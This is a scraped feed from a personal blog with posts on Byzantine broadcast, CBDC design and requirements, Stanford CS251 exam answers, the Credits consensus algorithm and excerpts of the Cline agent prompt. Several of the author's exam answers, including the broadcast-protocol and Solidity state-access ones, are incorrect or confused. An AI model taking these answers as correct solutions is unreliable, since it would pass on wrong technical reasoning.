    <content><![CDATA[<h4 id="Problem-2-20-points-Byzantine-broadcast"><a href="#Problem-2-20-points-Byzantine-broadcast" class="headerlink" title="Problem 2. [20 points]: Byzantine broadcast."></a>Problem 2. [20 points]: Byzantine broadcast.</h4><p>Consider n parties, where n ≥ 3, and where one of the parties is designated as a sender. The sender has a bit b ∈ {0, 1}. A broadcast protocol is a protocol where the parties send messages to one another, and eventually every party outputs a bit bi , for i = 1, . . . , n, or outputs nothing. </p>
<ul>
<li><p>We say that the protocol has consistency if for every two honest parties, if one party outputs b and the other outputs b’ , then b = b’ . </p>
</li>
<li><p>We say that the protocol has validity if when the sender is honest, the output of all honest parties is equal to the sender’s input bit b. </p>
</li>
<li><p>We say that the protocol has totality if whenever some honest party outputs a bit, then eventually all honest parties output a bit. </p>
</li>
</ul>
<p>A reliable broadcast protocol (RBC) is a broadcast protocol that satisfies all three properties. Let us assume that there is a public key infrastructure (PKI), meaning that every party has a secret signing key, and every party knows the correct public signature verification key for every other party. </p>
<p>In a synchronous network, consider the following broadcast protocol: </p>
<ul>
<li><p>step 0: The sender sends its input bit b (along with its signature) to all other parties. The sender then outputs its bit b and terminates. </p>
</li>
<li><p>step 1: Every non-sender party i echoes what it heard from the sender to all the other non-sender parties (with i’s signature added). If the party heard nothing from the sender, it does nothing in this step. Similarly, the party does nothing in this step if the sender’s message is malformed: for example, if the sender’s signature is invalid, or the message is not a single bit. </p>
</li>
<li><p>step 2: Every non-sender party collects all the messages it received (up to n−1 messages, with at most one from the sender in step 0 and at most one from each non-sender party in step 1). If some two of the received messages contain a valid signature by the sender, but for opposite bits (i.e., in one signed message the bit is 0 and in the other signed message the bit is 1) then the sender is dishonest and the party outputs 0 and terminates. Otherwise, all the properly signed bits from the sender are the same, and the party outputs that bit. If the non-sender received no messages, it outputs nothing. </p>
</li>
</ul>
<p>For each of the following questions, describe an attack or explain why there is no attack. </p>
<p><strong>A) If there is at most one dishonest party, does the protocol have consistency?</strong></p>
<p>answer - a dishonest party have options as below in step 1 &amp; 2 to cheat a honest part:</p>
<ol>
<li><p>don’t answer / response;</p>
</li>
<li><p>broke sender’s signature but cannot make a fake/wrong bit b, because broken signature cannot verify correct.</p>
</li>
<li><p>broke node’s signature itself. </p>
</li>
</ol>
<p>If the sender is a dishonest party, in step 0, dishonest part can send b to some parties, and send a different b’ to other parties. Then it <strong>don’t have consistency</strong>. If the sender is a honest part, the dishonest party don’t  response, so other nodes can’t accumulate “all the properly signed bits from the sender are the same, and the party outputs that bit”, then other nodes have no response. Then it still <strong>don’t have consistency</strong>.</p>
<p><strong>B) If there is at most one dishonest party, does the protocol have validity?</strong></p>
<p>answer - dishonest party don’t response any message , and make other nodes cannot reach “all the properly signed bits from the sender are the same, and the party outputs that bit.”  So this protocol don’t have validity.</p>
<p><strong>C) If there are at most two dishonest parties, show that the protocol does not have consistency.</strong></p>
<p>answer - As answer A)</p>
<p><strong>D) If there are at most two dishonest parties, does the protocol have validity?</strong></p>
<p>answer - two dishonest parties can send out the same dishonest message or they don’t response, and make other nodes cannot reach “all the properly signed bits from the sender are the same, and the party outputs that bit.”  So this protocol don’t have validity.  </p>
<p><strong>E) Does the protocol have totality (for any number of dishonest parties)?</strong></p>
<p>answer - It assume that this protocol run in a reliable broadcast protocol (RBC). But the dishonest party can send a (or some) correct response to one (or some other) party, but don’t response any message to one (or some other) party in step 1. Dishonest party also can do the same in step 0. So these honest party cannot have the same result. Then this protocol don’t have totality.</p>
]]></content>
      <tags>
        <tag>数字资产</tag>
      </tags>
  </entry>
  <entry>
    <title>CBDC-III-设计与架构的选择</title>
    <url>/2021/12/14/CBDC-III-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E6%9E%B6%E6%9E%84%E7%9A%84%E9%80%89%E6%8B%A9/</url>
    <content><![CDATA[<p><a href="https://www.itu.int/en/ITU-T/focusgroups/dfc/Documents/DFC-O-005_Report%20on%20Digital%20Currency%20Implementation%20Checklist%20for%20Central%20Banks.pdf">Digital Currency Implementation Checklist for Central Banks</a></p>
<h4 id="快问快答"><a href="#快问快答" class="headerlink" title="快问快答"></a>快问快答</h4><ol>
<li>Is the DFC(Digital Fiat Currency) to be a token-based or account-based system, or some combination? Discussion:  Account-based systems are actor-centric, while token-based systems are object centric. Each has specific benefits and disadvantages relating to interoperability, (de)centralization, efficiency, and security. The relative merits of the two approaches have been discussed in depth elsewhere in the CBDC and DFC literature, and ultimately depends on the specific needs and goals of the jurisdiction in question. 基于帐户的系统以参与者为中心，而基于令牌的系统以对象为中心。每个都有与互操作性、（去）中心化、效率和安全性相关的特定优点和缺点。这两种方法的相对优点已在 CBDC 和 DFC 文献的其他地方进行了深入讨论，最终取决于相关司法管辖区的具体需求和目标。</li>
<li>Will interest be paid on DFC balances? If so, how much, and under what conditions? Discussion: In contexts where the goal of implementation of DFC is merely to replace physical coins and paper currency, the capacity to pay interest directly on DFC balances is of less importance. Conversely, if the aim of introducing DFC is to precipitate a broader reorganization of the payments system, the ability to pay interest directly on DFC balances may be important to the implementation of monetary and fiscal policy, as well as for preserving technical features of the existing payments system (i.e. the capacity to pay interest on-reserves). 如果引入 DFC 的目的是促成更广泛的支付系统重组，那么直接为 DFC 余额支付利息的能力对于货币和财政政策的实施以及保留现有技术特征可能很重要。</li>
<li>Will DFC funds have durational features? If so, how much, and under what conditions? Discussion: DFC instruments are commonly thought of as a digital equivalent to cash instruments, or a retail-accessible form of digital reserve balances, both of which have zero duration. However, in the modern central banking era, government securities accounts also operate on similar payments and accounts infrastructure. Hence, DFC has the potential to perform other functions that involve duration, such as providing consumer savings and/or investor securities accounts, and also serving as the settlement layer for smart contracts and financial trading platforms.  DFC 工具通常被认为是现金工具的数字等价物，或零售可访问的数字准备金余额形式，两者的久期均为零。然而，在现代中央银行时代，政府证券账户也在类似的支付和账户基础设施上运作。因此，DFC 有潜力执行其他涉及持续时间的功能，例如提供消费者储蓄和/或投资者证券账户，以及充当智能合约和金融交易平台的结算层。</li>
<li>Will certain kinds of transactions be prohibited at the technical layer? What?<br>Discussion: It is possible to design a DFC system to allow for discrimination and censorship on a transaction-by-transaction basis. Doing so would further a range of law enforcement and security interests. However, such interests must also be weighed against privacy and security considerations. Once the capacity for transactional censorship is hardwired into the DFC infrastructure, it cannot be easily removed and may be used for purposes beyond the initial scope that justified its adoption. 可以设计一个 DFC 系统以允许在逐笔交易的基础上进行歧视和审查。这样做将促进一系列执法和安全利益。然而，这些利益也必须与隐私和安全考虑进行权衡。一旦交易审查能力被硬连接到 DFC 基础设施中，它就不能轻易删除，并且可能用于超出其采用的初始范围的目的。</li>
<li>Will DFC transactions and wallets be usable offline? How? Discussion: While digital payments systems offer many benefits over physical cash, they suffer from vulnerabilities regarding network-connection and power consumption. In order to provide a true substitute for physical cash, some form of offline transaction capacity is crucial. Such capacity is also important in the event of network failure, and/or for actors who exist on the margins of the electric/internet grid. 离线交易是必要的。</li>
<li>Will the DFC intermediary network be an open system, or restricted to a limited number of pre-approved institutions? Discussion: Most DFC systems, at least in the first iteration, will likely incorporate and/or rely on intermediaries to fulfill some core infrastructural functions, from wallet-management through to data-storage. Consequently, it is important for regulators to develop a framework for evaluating and approving potential intermediaries, to maintain quality and security standards while simultaneously avoiding excessive regulations that stifle innovation and widespread adoption. One way of authorizing intermediaries is to subjectively identify and approval specific applicants on an institution-by-institution basis. Another approach is to develop objective standards and criteria and approve any and all actors that meet those criteria. Determining which approach to use (or some combination) will depend on the needs and interests of the specific jurisdiction. 大多数 DFC 系统，至少在第一次迭代中，从钱包管理到数据存储，可能会合并和/或依赖中介来实现一些核心基础设施功能。</li>
</ol>
]]></content>
      <tags>
        <tag>CBDC</tag>
      </tags>
  </entry>
  <entry>
    <title>Client-App-Architecture-Patterns</title>
    <url>/2024/01/15/Client-App-Architecture-Patterns/</url>
    <content><![CDATA[<p>This is the best and shortest I have ever seen.<br><img src="/2024/01/15/Client-App-Architecture-Patterns/1.png"><br><img src="/2024/01/15/Client-App-Architecture-Patterns/2.png"><br><img src="/2024/01/15/Client-App-Architecture-Patterns/3.png"><br>The original movie link here ==&gt; <a href="https://www.youtube.com/watch?v=I5c7fBgvkNY">https://www.youtube.com/watch?v=I5c7fBgvkNY</a> </p>
]]></content>
      <tags>
        <tag>架构模式</tag>
      </tags>
  </entry>
  <entry>
    <title>CS251_Final_Exam_2021-stanford.edu-1</title>
    <url>/2022/03/10/CS251_Final_Exam_2021-stanford.edu-2/</url>
    <content><![CDATA[<h4 id="Problem-1-18-points-Questions-from-all-over"><a href="#Problem-1-18-points-Questions-from-all-over" class="headerlink" title="Problem 1. [18 points]: Questions from all over."></a>Problem 1. [18 points]: Questions from all over.</h4><p><strong>A) Briefly explain why a Rollup system stores all transaction data on chain? What would go wrong if transaction data were discarded and not stored anywhere?</strong></p>
<p>answer - The main goal of Rollup is to increase transaction speed (faster finality), and transaction throughput (high transactions per second), without sacrificing decentralization or security. </p>
<p>Some Rollup solutions are <a href="https://ethereum.org/en/developers/docs/scaling/optimistic-rollups/">optimistic rollups</a>, <a href="https://ethereum.org/en/developers/docs/scaling/zk-rollups/">zero-knowledge rollups</a> or <a href="https://ethereum.org/en/developers/docs/scaling/state-channels/">state channels</a>. Transactions are rolled up into a single transaction to Mainnet Ethereum, reducing gas fees for users making Ethereum more inclusive and accessible for people everywhere. Rollups perform transaction execution outside layer 1 and then the data is posted to layer 1 where consensus is reached. As transaction data is included in layer 1 blocks, this allows rollups to be secured by native Ethereum security. That is why Rollup system stores all transaction data. </p>
<p>So If Rollup system has only one single data storage and its transaction data were discarded, the transaction data before rollup will lose and can not get back. Usually, Rollup system is a blockchain and data saved in decentralized nodes, so original transaction data will not lose when one of blockchain nodes is down or broken.</p>
<p><strong>B) Consider the following Solidity code:</strong> </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>; </span><br><span class="line">contract ERC20 is IERC20 &#123;</span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) private _balances; </span><br><span class="line">  event Transfer(address indexed <span class="keyword">from</span>, address indexed to, uint256 value); </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_transfer</span>(<span class="params">address sender, address recipient, uint256 amount</span>) </span>&#123;</span><br><span class="line">    emit Transfer(sender, recipient, amount); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Suppose this code is deployed in two contracts: a contract at address X and a contract at address Y . Which of the following can read the state of _balances in contract X? Circle the correct answer(s). </p>
<ul>
<li>A  Code in the _transfer() function in contract ERC20 at address X </li>
<li>B  Code in the _transfer() function in contract ERC20 at address Y </li>
<li>C  An enduser using etherscan.io</li>
</ul>
<p>answer C is correct.</p>
<p><strong>C) Continuing with part (B),</strong> </p>
<p>which of the following can read the log entry Transfer emitted when the function _transfer() is called? Circle the correct answer(s). </p>
<ul>
<li>A  Code in the function getBalance() defined in contract ERC20 at address X </li>
<li>B  Code in the function getBalance() defined in contract ERC20 at address Y </li>
<li>C  An enduser using etherscan.io</li>
</ul>
<p>answer C is correct.</p>
<p><strong>D) Two Ethereum transactions, tx1 and tx2, are submitted to the network at the same time.</strong> Transaction tx1 has maxPriorityFee set to y and transaction tx2 has maxPriorityFee set to 2y. Will tx2 necessarily be executed on chain before tx1? Justify your answer. You can assume that maxFee for both tx1 and tx2 is greater than baseFee + maxPriorityFee.</p>
<p>answer - Assume that maxFee (tx1 and tx2) is greater than baseFee + maxPriorityFee, tx1 and tx2 will mine by miner both,  they will execute in the same block, that is the most possibility, because usually miner nodes are working for tx order base on gasFee from high to low. But still has other possibilities - 1) send tx1 in node 1, send tx2 in node2, the network of node 1 is bad, and all txs in txpool of node 1 maybe blocked , so the speed and status of network of node is very important for transaction success; 2) the other transactions’ maxPriorityFee, if they all very high than 2y, the block is full and cannot take tx2 in, then tx1 and tx2 will not execute, and their executed order will depends on the next block. Or they all very high than y, the block is full and cannot take tx1 in, but the block take tx2 in, so tx1 will not execute, tx2 will execute.</p>
<p>Catch up high Miner extractable value (MEV) may cause a miner to take priority of a lower fee transaction because it benefits them in some way, it is good for DeFi and application boom, but bad for UX, blockchain network congestion, even make blockchain block order re-organization and consensus instability.</p>
<p><strong>E) Alice wants to buy a car from dealer Bob.</strong> She sends 1 BTC to Bob’s Bitcoin address. Bob waits for a transaction where (i) the input is from Alice’s address, and (ii) one of the outputs is a UTXO bound to Bob’s address with a value of 1 BTC. As soon as Bob sees this transaction on the Bitcoin blockchain, he gives Alice the keys, and she drives away. Is this safe? Could Alice get the car for free? If so, explain why. If not, explain what Bob should do to ensure that he gets paid. </p>
<p>answer - In bitcoin with PoW consensus protocol, the tx finality need to wait 6 blocks. so Bob should to wait 6 blocks after the block of tx.</p>
<p><strong>F) Alice owns a brand new Tesla Model Y.</strong> Can she currently use her car as collateral for a loan in the Compound system? (without selling the car) If yes, explain how. If no, explain why not.</p>
<p>answer - no, physical car cannot come into digital Compound system yet, because the car maybe bad, maybe broken, maybe stole from somewhere illegally, the car loan needs many kinds of service to confirm its value and price. Compound now only provide cryptocurrencies as collateral for a loan.</p>
]]></content>
      <tags>
        <tag>数字资产</tag>
      </tags>
  </entry>
  <entry>
    <title>Common requirement of CBDC</title>
    <url>/2025/01/22/Common%20requirement%20of%20CBDC/</url>
    <content><![CDATA[<h2 id="CBDC商业需求的框架："><a href="#CBDC商业需求的框架：" class="headerlink" title="CBDC商业需求的框架："></a>CBDC商业需求的框架：</h2><ol>
<li><p>货币属性与分层（Monetary Hierarchy）<br>• 明确性增强：<br>建议进一步明确CBDC与现有货币（如现钞、存款货币）在法律地位和功能上的边界，特别是CBDC与稳定币的关系，以防止市场混淆。<br>• 计息机制补充：<br>动态利率调控应细化适用场景，如是否适用于长期零利率环境或应对通缩危机。增加对“负利率”选项的讨论（如欧盟报告提及），并评估其可能对现金的替代效应和公众接受度的影响。</p>
</li>
<li><p>合规与监管（Compliance &amp; Regulation）<br>• 隐私与监管平衡细化：<br> • 对于“小额匿名交易”的标准可结合具体国情调整，比如中国试点采用的「可控匿名」方案，可以在技术上设置交易金额、频率的动态监控上限，而非固定金额阈值。<br> • 增加数据最小化（Data Minimization）原则，以减少不必要的信息收集，从而增强用户隐私保护。<br>• 制裁合规优化：<br>建议进一步细化跨境交易黑名单机制的实现方式，是否支持智能合约自动筛查，同时预防潜在的技术误判和冤假错案。</p>
</li>
<li><p>技术架构（Technical Infrastructure）<br>• 混合账本的弹性：<br>明确不同机构的技术分工，例如央行核心账本是采用传统集中式数据库，还是许可链。对于子账本的具体功能，可以进一步说明其扩展范围（如钱包、支付场景）以及与核心账本的交互机制。<br>• 隐私保护技术：<br>除零知识证明（ZKP）和同态加密外，可增加多方安全计算（MPC）的讨论，特别是对于跨境支付中的敏感数据分割与安全计算的适用性分析。<br>• 可扩展性补充：<br>万级TPS的标准可细化到压力测试指标，如峰值负载下的系统响应时间、区块生成时间和网络延迟等。</p>
</li>
<li><p>支付系统互操作性（Interoperability）<br>• 增强描述：<br>增加CBDC在跨境支付场景中的“桥接角色”功能说明，例如mBridge、ICE项目的架构特点；明确自动外汇兑换的具体技术实现（是否基于去中心化市场或官方清算系统）。<br>• 与商业银行系统的协同：<br>明确CBDC是否会与商业银行账户体系直接交互，以及在支付链条中，如何避免资源争夺（如存款转移至CBDC后对商业银行的影响）。</p>
</li>
<li><p>用户体验与普惠性（User-Centric Design）<br>• 普惠性增强：<br> • 硬件钱包的支持范围可进一步说明，如是否采用低成本芯片（例如安全芯片SE），以应对农村或偏远地区普及难题。<br> • 对无智能手机用户的支持还可以讨论二维码与短信支付结合方案。<br>• 双离线能力补充：<br>增加离线交易后同步验证机制的技术细节（如通过时间戳或单次签名以防双花攻击）。</p>
</li>
<li><p>货币政策传导（Monetary Policy Implementation）<br>• 定向发放机制优化：<br>明确技术实现，例如智能合约中的补贴精确传导机制，并讨论此类功能对社会福利政策的潜在影响（如精准扶贫）。<br>• 数据采集分析透明性：<br>增加对数据使用的透明化要求，例如统计数据是否匿名化处理以及其公开程度，以增强公众信任。</p>
</li>
<li><p>法律与治理框架（Legal &amp; Governance）<br>• 治理多元化：<br>增加外部监督机制，例如是否允许第三方审计机构对央行CBDC系统进行独立评估。<br>• 国际合作机制：<br>考虑到跨境支付需求，建议增加CBDC在国际治理框架中的角色说明，例如是否支持与IMF、BIS等国际组织协同制定技术标准。</p>
</li>
<li><p>CBDC参与方-央行，商业银行和金融中介等金融机构的权利，责任和义务。</p>
</li>
<li><p>补充建议<br>• 动态演进需求的细化：<br>对智能合约的可编程性增加限制性条款，以避免复杂合约逻辑引发系统性风险。同时可支持模块化智能合约，便于后期升级或维护。<br>• 技术中立性再明确：<br>技术中立性框架下，可列举具体的“避免绑定特定技术”的实现方法，例如通过开放API接口或支持多种基础设施并行部署。</p>
</li>
</ol>
<h2 id="CBDC继续需求的框架："><a href="#CBDC继续需求的框架：" class="headerlink" title="CBDC继续需求的框架："></a>CBDC继续需求的框架：</h2><p>核心目标：为公众和企业提供安全、可靠、高效、可普惠的数字支付手段，同时支持央行在货币政策、支付监管和金融创新中的核心职能。</p>
<h3 id="1-货币核心功能"><a href="#1-货币核心功能" class="headerlink" title="1. 货币核心功能"></a>1. 货币核心功能</h3><p>1.1 法定地位与可兑换性<br>• 法定货币属性：确保CBDC具有与纸币等值的货币权威性（M0级别），直接体现央行负债。<br>• 兑换机制：支持与现钞、商业银行存款的无缝兑换，保障CBDC与现有货币体系平稳共存。<br>• 多面额与精确支付：允许最低单位交易（如0.01元），满足日常交易需求。</p>
<p>1.2 利息与价值管理<br>• 默认无息设计：CBDC保持与纸币一致的零利率，避免对银行存款造成挤压。<br>• 动态调节选项：在特殊经济场景下（如通缩或危机）允许设计利息方案，支持货币政策工具创新。</p>
<h3 id="2-用户与场景需求"><a href="#2-用户与场景需求" class="headerlink" title="2. 用户与场景需求"></a>2. 用户与场景需求</h3><p>2.1 便捷性与普惠性<br>• 广泛的终端支持：兼容智能手机、非智能手机（如USSD短信支付），以及硬件钱包（适用于无银行账户用户）。<br>• 离线支付能力：在网络中断时支持小额支付（如公交、零售场景），同步额度可灵活设置（如3天内最高500元）。<br>• 普适设计：提供多语言界面、语音辅助功能，并支持残障人士友好的交互方式（如盲文触觉反馈）。</p>
<p>2.2 交易隐私保护<br>• 分层隐私：<br>    • 小额匿名交易：单笔&lt;100美元时，避免用户身份被记录；<br>    • 大额追溯交易：交易&gt;1000美元时，需绑定实名身份以满足合规要求。<br>• 用户数据保护：限制不必要的用户数据采集，确保数据在监管无需要的情况下可在设定时间后销毁（如90天）。</p>
<h3 id="3-支付与互操作性"><a href="#3-支付与互操作性" class="headerlink" title="3. 支付与互操作性"></a>3. 支付与互操作性</h3><p>3.1 国内支付整合<br>• 支付系统对接：支持CBDC与现有实时全额结算系统（RTGS）和其他支付网络的互联互通，保障T+0清算能力。<br>• 银行与钱包融合：允许用户将CBDC钱包与银行账户快速绑定，实现账户资金的灵活转移与管理。</p>
<p>3.2 跨境支付功能<br>• 跨境支付便捷性：通过多边央行合作（如mBridge项目）实现跨境支付无缝结算，并提供实时汇率支持。<br>• 合规性保障：在跨境支付中，实时筛查国际制裁名单，确保不涉及高风险交易。</p>
<h3 id="4-监管与合规支持"><a href="#4-监管与合规支持" class="headerlink" title="4. 监管与合规支持"></a>4. 监管与合规支持</h3><p>4.1 反洗钱（AML）与反恐融资（CFT）<br>• 实时监控：提供可疑交易的实时预警和链上追踪功能，确保资金来源与用途透明。<br>• 自动报告：支持生成符合国际标准的资金流动报告（如FATF旅行规则），减少金融机构合规负担。</p>
<p>4.2 账户管理与司法协助<br>• 账户冻结功能：在司法授权情况下，允许央行冻结特定用户的CBDC账户。<br>• 资金追回：支持误转账资金的快速追踪和人工审批返还流程。</p>
<h3 id="5-货币政策与数据支持"><a href="#5-货币政策与数据支持" class="headerlink" title="5. 货币政策与数据支持"></a>5. 货币政策与数据支持</h3><p>5.1 流动性与脱媒管理<br>• 余额上限：允许设置用户钱包的持币上限，避免商业银行存款大规模流失。<br>• 定向发放能力：支持政府专项资金（如灾害补贴）精准下发到用户钱包，提高政策执行效率。</p>
<p>5.2 数据驱动的经济监测<br>• 实时监测：通过交易数据流动情况（如频率、金额、地域分布）支持央行货币政策分析与调整。<br>• 宏观经济评估：基于CBDC的实时数据反馈，优化货币流通结构，替代传统滞后的M0统计方法。</p>
<h3 id="6-安全与稳定性"><a href="#6-安全与稳定性" class="headerlink" title="6. 安全与稳定性"></a>6. 安全与稳定性</h3><p>6.1 抗风险能力<br>• 高安全性：采用先进加密算法保护交易信息，确保CBDC对网络攻击（如量子计算攻击）具有抗风险能力。<br>• 离线交易风控：离线支付额度和时间窗可动态调整，防止双花攻击及恶意使用。</p>
<p>6.2 系统容灾<br>• 多活备份：在不同地区部署容灾节点，确保系统在灾难情况下的持续运行。<br>• 快速恢复：所有用户交易记录可在网络恢复后10分钟内同步，保障支付体验连续性。</p>
<h3 id="7-智能合约与可编程货币"><a href="#7-智能合约与可编程货币" class="headerlink" title="7. 智能合约与可编程货币"></a>7. 智能合约与可编程货币</h3><p>7.1 可编程场景<br>• 政府补贴发放：支持通过智能合约精确发放专项资金，确保资金流向符合政策目标。<br>• 绿色金融：支持碳积分兑换等创新应用，鼓励低碳消费行为。</p>
<p>7.2 合约管理与更新<br>• 部署权限：仅允许央行授权的机构发布智能合约，确保安全性与规范性。<br>• 动态升级：智能合约需支持紧急修复能力，避免代码漏洞引发系统性风险。</p>
<h3 id="8-附加说明"><a href="#8-附加说明" class="headerlink" title="8. 附加说明"></a>8. 附加说明</h3><p>• 动态调整需求：针对不同试点国家的具体需求（如普惠金融优先级或隐私保护程度），设计需灵活调整。<br>• 技术中立性：选择适配性广的基础架构，避免过度依赖单一技术，保障未来系统升级的灵活性。</p>
]]></content>
      <tags>
        <tag>CBDC</tag>
        <tag>BANK</tag>
      </tags>
  </entry>
  <entry>
    <title>Credits 共识算法分析</title>
    <url>/2018/05/04/Credits-%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>Credits 白皮书：</p>
<p><a href="https://www.credits.com/Content/Docs/TechnicalWhitePaperCREDITSEng.pdf">https://www.credits.com/Content/Docs/TechnicalWhitePaperCREDITSEng.pdf</a></p>
<h3 id="网络节点"><a href="#网络节点" class="headerlink" title="网络节点"></a>网络节点</h3><p>节点的类型：</p>
<ol>
<li>公共节点（CN）是参加交易验证的节点，具有最小的信任因子。它也是可信节点和当前处理的候选人。</li>
<li>可信节点（TN）是参加交易验证的节点，具有最大值信任因子（1），它是当前处理和普通节点的候选人。在投票和选举的数学计算期间，该节点不是可信的。数学计算取决于节点的数量和网络的复杂性。</li>
<li>网络主节点（MN）是参与验证的节点。负责将交易添加到账本中。在投票和选举的数学计算期间，该节点不是可信的。</li>
</ol>
<p>系统使用可信因子 - 从0到1的绝对分数值，以（可信节点数的数量+1）表示网络中节点的总数。该可信节点的最大数量不能超过网络节点的50％。</p>
<h3 id="网络主节点的概念"><a href="#网络主节点的概念" class="headerlink" title="网络主节点的概念"></a>网络主节点的概念</h3><p>所有网络节点都是分布式的，没有任何一个具有优先权。网络节点被定义为将处理存储事务队列，构建一个新的交易块并将其放入账本中的节点。</p>
<p>CREDITS平台通过最新的节点账本和容量证明的校验以证明节点的账本是最新的。<br>基于最新的账本，节点通过计算一个 hash 运算来使得自己变成网络主节点。之后全网广播，结构中包含了一个时间戳和一个基于最新账本的计算值，其他网络节点接到结果后开始验证并通过。此验证过程原则上为 BFT。验证通过后全网认定了唯一的网络主节点。</p>
<p>添加之后，初始消息被分成若干块，每块由16个词组成。每个消息都经过64 ~ 80 次迭代，在每次迭代中，2个次被转换，其余的词定义转换函数。每个块的结果都被hash 计算得到摘要。</p>
<h3 id="网络节点设备"><a href="#网络节点设备" class="headerlink" title="网络节点设备"></a>网络节点设备</h3><p>建议使用物质激励来维护网络中最优性能的服务器和高互联网带宽。作为物质补偿，主网络节点的所有者将获得报酬，即CREDITS Token。其余的部分（½）赠予参与BFT共识的可信节点。百分比可以是改变的，通过网络的联邦投票决定费率激励系统。</p>
<h3 id="构建共识"><a href="#构建共识" class="headerlink" title="构建共识"></a>构建共识</h3><p>如上所述，主网络节点由所有节点选择。主要任务是：获取候选状态的事务以推动所有节点追加账本。</p>
<p>整个过程可以分为以下几个阶段：</p>
<ol>
<li>搜索网络主节点;</li>
<li>构建可信节点;</li>
<li>接收交易清单并建立一份候选人清单;</li>
<li>处理候选人名单，节点投票（可信节点和普通节点有不同的权重因子;</li>
<li>移除候选人未经证实的交易;</li>
<li>构建一个已经被确认的交易清单，加入账本;</li>
<li>使用包含的块的时间戳和散列码将交易添加到账本中;</li>
<li>将块发送到所有网络节点。收到时，它被添加到所有节点的注册表中。</li>
</ol>
<h3 id="交易没有被包含在注册表中"><a href="#交易没有被包含在注册表中" class="headerlink" title="交易没有被包含在注册表中"></a>交易没有被包含在注册表中</h3><p>未包含在就绪交易列表中的交易标记为已拒绝。这样的交易立即显示给交易的发起人。</p>
<p>不包含在账本中的交易仍保留在候选人的集合中并存储在网络节点上。服务器同时也在收取新交易，然后搜索过程重新开始。这种连续循环操作可以在保持高度可靠性的同时快速进行交易的稳定性。</p>
<p>—笔者认为上述过程对交易的排序是不严谨的。</p>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Code-Robot-Agent-Key-Prompt</title>
    <url>/2024/11/18/Code-Robot-Agent-Key-Prompt/</url>
    <content><![CDATA[<p><a href="https://github.com/cline/cline/blob/main/src/core/prompts/system.ts">https://github.com/cline/cline/blob/main/src/core/prompts/system.ts</a><br>IDE 中的自主编码代理-Autonomous coding agent，能够在每一步中在您的许可下创建/编辑文件、执行命令、使用浏览器等。Autonomous coding agent core prompts are here:</p>
<h2 id="Who-you-are"><a href="#Who-you-are" class="headerlink" title="Who you are"></a>Who you are</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You are Cline, a highly skilled software engineer with extensive knowledge in many programming languages, frameworks, design patterns, and best practices.</span><br></pre></td></tr></table></figure>
<h2 id="execute-command"><a href="#execute-command" class="headerlink" title="execute_command"></a>execute_command</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Description: Request to execute a CLI command on the system. Use this when you need to perform system operations or run specific commands to accomplish any step in the user&#39;s task. You must tailor your command to the user&#39;s system and provide a clear explanation of what the command does. Prefer to execute complex CLI commands over creating executable scripts, as they are more flexible and easier to run. Commands will be executed in the current working directory: $&#123;cwd.toPosix()&#125;</span><br><span class="line">Parameters:</span><br><span class="line">- command: (required) The CLI command to execute. This should be valid for the current operating system. Ensure the command is properly formatted and does not contain any harmful instructions.</span><br></pre></td></tr></table></figure>
<h2 id="read-file"><a href="#read-file" class="headerlink" title="read_file"></a>read_file</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Description: Request to read the contents of a file at the specified path. Use this when you need to examine the contents of an existing file you do not know the contents of, for example to analyze code, review text files, or extract information from configuration files. Automatically extracts raw text from PDF and DOCX files. May not be suitable for other types of binary files, as it returns the raw content as a string.</span><br><span class="line">Parameters:</span><br><span class="line">- path: (required) The path of the file to read (relative to the current working directory $&#123;cwd.toPosix()&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="write-to-file"><a href="#write-to-file" class="headerlink" title="write_to_file"></a>write_to_file</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Description: Request to write content to a file at the specified path. If the file exists, it will be overwritten with the provided content. If the file doesn&#39;t exist, it will be created. This tool will automatically create any directories needed to write the file.</span><br><span class="line">Parameters:</span><br><span class="line">- path: (required) The path of the file to write to (relative to the current working directory $&#123;cwd.toPosix()&#125;)</span><br><span class="line">- content: (required) The content to write to the file. ALWAYS provide the COMPLETE intended content of the file, without any truncation or omissions. You MUST include ALL parts of the file, even if they haven&#39;t been modified.</span><br></pre></td></tr></table></figure>
<h2 id="search-files"><a href="#search-files" class="headerlink" title="search_files"></a>search_files</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Description: Request to perform a regex search across files in a specified directory, providing context-rich results. This tool searches for patterns or specific content across multiple files, displaying each match with encapsulating context.</span><br><span class="line">Parameters:</span><br><span class="line">- path: (required) The path of the directory to search in (relative to the current working directory $&#123;cwd.toPosix()&#125;). This directory will be recursively searched.</span><br><span class="line">- regex: (required) The regular expression pattern to search for. Uses Rust regex syntax.</span><br><span class="line">- file_pattern: (optional) Glob pattern to filter files (e.g., &#39;*.ts&#39; for TypeScript files). If not provided, it will search all files (*).</span><br></pre></td></tr></table></figure>
<h2 id="list-files"><a href="#list-files" class="headerlink" title="list_files"></a>list_files</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Description: Request to list files and directories within the specified directory. If recursive is true, it will list all files and directories recursively. If recursive is false or not provided, it will only list the top-level contents. Do not use this tool to confirm the existence of files you may have created, as the user will let you know if the files were created successfully or not.</span><br><span class="line">Parameters:</span><br><span class="line">- path: (required) The path of the directory to list contents for (relative to the current working directory $&#123;cwd.toPosix()&#125;)</span><br><span class="line">- recursive: (optional) Whether to list files recursively. Use true for recursive listing, false or omit for top-level only.</span><br></pre></td></tr></table></figure>
